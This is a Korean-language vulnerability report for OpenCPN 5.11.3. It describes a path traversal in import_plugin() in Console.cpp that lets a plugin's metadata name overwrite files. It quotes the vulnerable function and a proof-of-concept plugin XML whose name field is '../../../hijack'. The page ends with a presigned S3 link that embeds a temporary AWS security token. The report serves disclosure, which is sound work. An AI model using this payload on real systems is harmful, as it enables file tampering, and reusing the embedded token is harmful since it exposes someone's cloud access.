---
notion_url: https://www.notion.so/c3bbe0809830830a942b01d9cc6acbc6
last_synced: 2026-06-12 00:59
tags: [notion-sync]
---

# [KOR] OpenCPN File overwrite - Path traversal report

취약점 제목 : OpenCPN File overwrite - Path traversal report
취약점 요약 : 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Path Traversal
영향 : 프로세스 권한의 File Overwrite
취약한 파일명 : Console.cpp
취약한 함수명 : import_plugin()
취약한 파라미터 : metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```

`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```

 `<name>` 에 ..나 /를 넣어 Path traversal 시도

![image](_assets/image.png)


취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VPMQIOKN%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T155903Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIDNKcxiwfwHal0%2Fm1qkXBSqgev3ZACb8P1logzF2VaZdAiEA4X1fdqnvXGI2untf%2FF9mo1DDqxAgtWnWhCsBAu8uFP0qiAQI%2Fv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDAYqlGjRTXkU6DB7xircA9ERFPk2XxbBwAkp67Giey9vvOL73NVoyFlo%2FV2RjBZjKbyfkKfgywNpH3fo2y%2B3WkvPz0HJ5J%2FwqNmd4zzsFyOQmOpJvYBkJtHwUa4tlmwt5pusmPxY8PnPXiYoy5wDr5FF1AHwmX9nwBfgW5oC4qipOYP32J0jTCmrq7OBdWV6QhWisOogxKajCDxn%2Fwm2ALGg%2Fvigr5%2BcFc%2BDcfmsJkq0njz5m5ZZqLhu7d1xNe7byuxGzZiJGgN%2BfqAuncktdyWj7OkIrL2rKtW%2BDkVfDz1E4CgZy7Wxi7xltDIEPEsMfXPTqOrohzh70ozX7vz4NsK18ruhWNISPiufAxhuCk00c8T9p9F1wQ17FinVIOoExZOU6GUbp1n6quFLtgOGjpyTva5twe%2BYV3pOxWmTPlNwtkc7HsNcSLJvURl5Xx9UhZoE74NsOxmHrU1ronYhVxDZsqOs3M5eOjE%2FT5kV%2FDpTL91h4KSiXKPEJixpV6wzWoQPrY5lUNz4uHpn5nrPPnNFXQlfdJPMOgATBhWGm41RPlIprFlebKf8rMIDwmw3zmfw%2B6s2QSwo7soRYslCedP5WsV9bUxRgoH8lBsDFXGQI1gDXf2FvS9dEmHuH4CCAr%2FdH4LtMNbV8PzGMJLZqtEGOqUBfhIh%2BP%2BsVUUf%2FKxpSGdVVW6iPbSLkxUrRi9INARAT1cBqcWTGz4cQT%2FGBGANPpL23XKI35rg527RwlBl2WFvWXr%2BzT5F3Gd3pJfeZERVEmIK6n9vNQpSjhPKndTKRqdiiAIHeSv7x6S9gwyc3oW%2F5e1Db%2B%2FC4VzTjHQZkGHosEGlo6uvAMkziw5zGIpeOq4DWAoc5sjEpEoJz6s8mhPmV%2BOltBKJ&X-Amz-Signature=7fec3b2fa85157c4d6c504d5d575992302319f284ce7b809e449e88c0d0fb9d2&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
